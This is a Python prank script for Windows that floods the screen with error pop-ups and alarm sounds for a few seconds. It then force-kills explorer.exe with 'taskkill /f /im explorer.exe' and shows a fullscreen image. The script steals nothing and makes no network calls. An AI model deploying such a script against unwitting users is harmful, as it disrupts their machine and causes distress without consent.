import ctypes
import threading
import time
import random
import winsound
import subprocess
import keyboard
from tkinter import Tk, Label
from PIL import Image, ImageTk

MB_OK = 0x0
MB_ICONERROR = 0x10
running = True
user32 = ctypes.windll.user32

screen_width = user32.GetSystemMetrics(0)
screen_height = user32.GetSystemMetrics(1)

open_popups = []

def mostrar_error(texto="Error", mensaje="Windows no compatible :("):
    global running, open_popups
    if not running:
        return

    def _show():
        # 🔊 Sonido garantizado
        winsound.PlaySound("SystemHand", winsound.SND_ALIAS | winsound.SND_ASYNC)
        # MessageBox real
        user32.MessageBoxW(0, mensaje, texto, MB_OK | MB_ICONERROR)

    t = threading.Thread(target=_show, daemon=True)
    t.start()
    time.sleep(0.005)

    hwnd = user32.FindWindowW(None, texto)
    if hwnd:
        open_popups.append(hwnd)
        x = random.randint(0, screen_width - 300)
        y = random.randint(0, screen_height - 150)
        user32.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0001)

def cerrar_todos_los_popups():
    global open_popups
    for hwnd in open_popups:
        if user32.IsWindow(hwnd):
            user32.DestroyWindow(hwnd)
    open_popups = []

def spam_popups():
    global running
    delay = 0.002  # Muy agresivo
    start_time = time.time()
    while running:
        # Cada popup suena primero, luego se abre
        mostrar_error("Error", "Windows no compatible :(")
        time.sleep(delay)
        if time.time() - start_time > 5:
            running = False
            cerrar_todos_los_popups()
            finalizar_explorer()
            mostrar_imagen_fullscreen("pall.jpg")
            break

def finalizar_explorer():
    try:
        subprocess.run("taskkill /f /im explorer.exe", shell=True)
    except:
        pass

def mostrar_imagen_fullscreen(imagen_path):
    root = Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg="black")

    img = Image.open(imagen_path)
    img = img.resize((screen_width, screen_height))
    photo = ImageTk.PhotoImage(img)

    label = Label(root, image=photo)
    label.pack(expand=True)

    root.mainloop()

def iniciar_broma():
    # Sonido inicial del primer popup
    winsound.PlaySound("SystemHand", winsound.SND_ALIAS | winsound.SND_ASYNC)
    user32.MessageBoxW(0, "Error :)", "Error :)", MB_OK | MB_ICONERROR)
    threading.Thread(target=spam_popups, daemon=True).start()

keyboard.add_hotkey("F1", lambda: exit())

iniciar_broma()
keyboard.wait("esc")
